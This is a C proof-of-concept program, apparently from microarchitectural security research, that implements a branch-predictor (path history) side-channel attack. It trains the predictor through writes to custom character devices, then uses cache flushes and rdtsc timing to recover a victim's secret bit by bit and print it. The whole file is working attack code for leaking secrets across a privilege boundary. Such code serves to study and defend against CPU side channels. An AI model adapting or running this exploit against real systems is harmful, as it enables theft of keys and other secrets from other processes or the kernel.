#include "Attacker_rsa.h"
#include "Victim.h"
#include <x86intrin.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

unsigned char attacker_array[Cache_Line];
int len_array[Cache_Line];
int times;
char mark;

#define flush(ptr) \
    asm volatile( \
        "clflush (%0)\n"\
        : \
        : "c" (ptr) \
    )

#define min(x, y) (x) < (y) ? (x) : (y)

int PHR_Flush(int fd, int shift) {
    int i=0;
    volatile int temp = 3;
    // asm("nop; nop; nop;\n\t");
    for(i = 0; i < PHR_LEN+1; i++) {
        i += (i+1)/(i+1)-1;
    }
    asm volatile("mfence");
    
    temp+=read(fd, "not affect res", 15);

    for(i = 0; i < shift; i++) i += (i+1)/(i+1)-1;
    asm volatile("mfence");
    // puts("");
    if (i < len_array[0])
        temp += attacker_array[0];

    return temp;
}

int main(int argc, char* argv[]) {
    unsigned long long start, end;
    unsigned char temp;
    char buf[30];
    int gened[BYTE_MAX];

    volatile int tmp = 0;
    for (int i = 0; i < BYTE_MAX; i++) gened[i] = 0;
    int fd0 = open("/dev/mychardev-0", O_RDWR), fd1 = open("/dev/mychardev-1", O_RDWR);
    int offset;

    if (argc >= 2)
        offset = atoi(argv[1]);
    else offset = 6;
    // printf("secret is %d\n", secret);
    int idx=0;

    srand(time(NULL));

    
unsigned char train_buf[30];
#define BYTE_MAX_1 255
#define REP_TIMES 20
for (int i = 0; i < 10; i++) train_buf[i] = BYTE_MAX_1;

int num = 0;
while(1) {
    times = 0;
    mark = 0;
    int buf_idx = num/8;
    int buf_bit = num%8;
    int sum_tim = 0;
    int shift = PHR_LEN-3-offset;
    
    if (shift < 0) break;
    for (int rep = 0; rep < REP_TIMES; rep++) {
        // usleep(10000);
    for (int k = 0; k < ATK_ROUNDS; k++) {

        // train 1
        len_array[0] = PHR_LEN+10;

        train_buf[buf_idx] |= (1<<buf_bit);
        write(fd0, train_buf, buf_idx+1);
        for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
            tmp+=PHR_Flush(fd0, shift);
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
            asm volatile("mfence");
        }
        // train 0
        len_array[0] = shift;
        train_buf[buf_idx] &= (BYTE_MAX_1-(1<<buf_bit));
        write(fd0, train_buf, buf_idx+1);
        for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
            tmp+=PHR_Flush(fd0, shift);
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
            tmp+=(tmp+1)/(tmp+1)-1;
            asm volatile("mfence");
        }

        // attacker retrieve
        flush(attacker_array+0*Cache_Line); flush(len_array+0*Cache_Line);

        tmp+=PHR_Flush(fd1, shift);

        len_array[0] = PHR_LEN+10;

        unsigned int tsc_aux;

            asm volatile("mfence");
            start = __rdtsc();
            temp = *(unsigned char*)(attacker_array+0*Cache_Line);
            end = __rdtscp(&tsc_aux);
            asm volatile("lfence");
            sum_tim += end-start;
            times += (end-start) <= HIT_THRESHOLD;
            
    }
        mark = times >= TIMES_THRESHOLD;
    }
        if(mark) {
            printf("confidence [%d] hit at: %d, means secret equals 1\n", times, shift);
            train_buf[buf_idx] |= (1 << buf_bit);
            //offset+=1;
        } else {
            printf("confidence [%d] hit at: %d, means secret equals 0\n", times, shift);
            offset += 1;
        }
    num++;
    offset += 2;
}
    close(fd0);
    close(fd1);
    long ans = 0;
    for (int i = 0; i < 7; i++)
        ans = (ans<<8) + train_buf[6-i];
    printf("%lx\n", ans);
    puts("");
}
